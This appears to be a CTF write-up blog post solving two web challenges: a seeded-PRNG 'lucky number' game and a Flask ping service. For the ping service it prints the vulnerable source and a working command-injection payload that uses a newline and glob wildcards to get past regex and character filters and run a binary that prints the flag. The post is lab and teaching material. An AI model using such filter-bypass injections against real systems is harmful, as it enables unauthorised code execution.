---
layout: post
title:  "Web Challenges"
date:   2026-06-29 14:02:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /TraceBash-CTF-2026-web/
---
* TOC
{:toc}
## Random Cheese

**Category**: web

**Author:** DeadDroid

**Description**: Jerry's finally opened his dream cheese shop, and Tom is furious! Every customer gets a lucky draw — spin the wheel 10 times and score 85+ to win the grand meal. But Tom rigged the system to make sure nobody ever gets THAT lucky... or did he?
`https://web-random-cheese.tracebash.xyz/`

I went to the site and registered and logged in:

![Alt text](/images/tracebashweb1.png)

You need to spin the wheel 10 times and get a score above `85`.

On `/settings` you can set a number between `1-1000`:

![Alt text](/images/tracebashweb2.png)

When I set the number to `1`, I roll this sequence of 10 numbers:
`3, 10, 2, 5, 2, 8, 8, 8, 7, 4`

I ran this python to confirm how their PRNG works:
```python
python3  
Python 3.13.5 (main, May 5 2026, 21:05:52) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import random  
...  
... seed = 1  
... random.seed(seed)  
... for i in range(10):  
...     print(random.randint(1, 10), end=' ')  
...  
3 10 2 5 2 8 8 8 7 4
```

I run this python to find a seed which will get a score above `85`:
```python
python3  
Python 3.13.5 (main, May 5 2026, 21:05:52) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import random  
...  
... def find_winning_seed(start=1, limit=1000):  
...     for seed in range(start, limit):  
...         random.seed(seed)  
...         total = sum(random.randint(1, 10) for _ in range(10))  
...         if total >= 85:  
...             return seed, total  
...     return None  
...  
... seed, total = find_winning_seed()  
... print(f"Use lucky number: {seed}")  
...  
Use lucky number: 854  
>>> exit
```

```python
python3  
Python 3.13.5 (main, May 5 2026, 21:05:52) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import random  
...  
... seed = 854  
... random.seed(seed)  
... for i in range(10):  
...     print(random.randint(1, 10), end=' ')  
...  
6 6 9 9 10 8 10 9 10 10 
>>> total = 6+6+9+9+10+8+10+9+10+10  
>>> print(total)  
87  
>>> exit
```

I set my lucky number to `854` and rolled another 10 times to get the flag.

`TBCTF{t0m_4nd_j3rry_l0v3s_ch33s3_4nd_r4nd0mness}`

___

## Ping Me

**Category**: web

**Author:** DeadDroid

**Description**: Tom wants to ping Jerry's IP, but the paranoid network admin built an "unbreakable" firewall around the ping utility. Digits and dots only — absolutely no funny business. Can you help Tom reach Jerry through the fortress of rules? `https://web-ping-me.tracebash.xyz/`

I get source code for this challenge. Contents of `app.py`:
```python
from flask import Flask, request, jsonify, render_template
import subprocess
import re
import unicodedata

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/ping', methods=['POST'])
def ping():
    ip = request.get_data(as_text=True)
    if not ip:
        return jsonify({'error': 'ERR: Target Address is required.'})

    # 15 characters should be enough because IPv4 has max 15 chars 255.255.255.255    
    if len(ip) > 15:
        return jsonify({'error': 'ERR: Input exceeds maximum length of 15 characters.'})

    # If it has letters, it's probably witchcraft.
    if any(c.isalpha() for c in ip):
        return jsonify({'error': 'SECURITY ALERT: Letters are not allowed!'})

    # Removing `$` was cheaper than hiring a security engineer.
    if '$' in ip:
        return jsonify({'error': 'SECURITY ALERT: $ character is not allowed!'})

    # Trust me bro, this filter is unbreakable.
    if not re.match(r"^[\d.]+$", ip, flags=re.MULTILINE):
        return jsonify({'error': 'SECURITY ALERT: Invalid IPv4 Address!'})

    # Because everyone loves typing ./ for some reason.
    if './' in unicodedata.normalize('NFKC', ip):
        return jsonify({'error': 'SECURITY ALERT: Path traversal not allowed!'})

    command = f"ping -c 1 -W 2 {ip}"
    
    try:
        output = subprocess.check_output(
            command, 
            shell=True, 
            executable='/bin/bash',
            stderr=subprocess.STDOUT, 
            timeout=5
        )
        return jsonify({'output': output.decode('utf-8', errors='ignore')})
    except subprocess.CalledProcessError as e:
        return jsonify({'output': e.output.decode('utf-8', errors='ignore')})
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'ERR: Connection timed out.'})
    except Exception as e:
        return jsonify({'error': f'ERR: {str(e)}'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5030)
```

`readflag.c`:
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *flag = getenv("FLAG");
    if (flag != NULL) {
        printf("%s\n", flag);
    } else {
        printf("FLAG environment variable not set.\n");
    }
    return 0;
}
```

I cant use any letters. Also no `$` or `./`. I am able to bypass the regex by sending `0`, then `\n` which will create a newline. 

I sent `0\n/???/????????`. After `ping` runs the shell executes `/app/readflag`:
```shell
curl -X POST https://web-ping-me.tracebash.xyz/api/ping -H "Content-Type: text/plain" --data-binary $'0\n/???/????????'  
{"output":"PING 0 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.023 ms\n\n--- 0 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.023/0.023/0.023/0.000 ms\nTBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}\n"}
```

`TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}`
